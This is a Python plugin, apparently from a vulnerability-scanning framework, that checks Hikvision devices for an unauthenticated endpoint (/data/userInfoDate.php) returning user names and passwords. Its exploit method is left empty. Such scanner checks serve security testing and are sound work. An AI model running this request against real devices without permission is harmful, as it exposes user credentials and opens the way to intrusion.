import requests

from loguru import logger

from .base import POCTemplate


class Hikvision7088Post(POCTemplate):

    def __init__(self, config):
        super().__init__(config)
        self.name = self.get_file_name(__file__)
        self.product = config.product['hikvision']
        self.product_version = ''
        self.ref = ''
        self.level = POCTemplate.level.medium
        self.desc = """"""
        self.headers = {
            'Connection': 'close',
            'User-Agent': self.config.user_agent,
            'Content-Type': 'application/x-www-form-urlencoded',
        }

    def verify(self, ip, port=80):
        url = f"http://{ip}:{port}/data/userInfoDate.php"
        payload = "page=1&rows=20&sort=userId&order=asc"
        try:
            r = requests.post(url, data=payload, headers=self.headers, timeout=self.config.timeout, verify=False)
            if r.status_code == 200 and ('name' in r.text) and ('password' in r.text):
                return ip, str(port), self.product, '', '', self.name
        except Exception as e:
            logger.error(e)
        return None

    def exploit(self, results):
        pass


POCTemplate.register_poc(Hikvision7088Post)
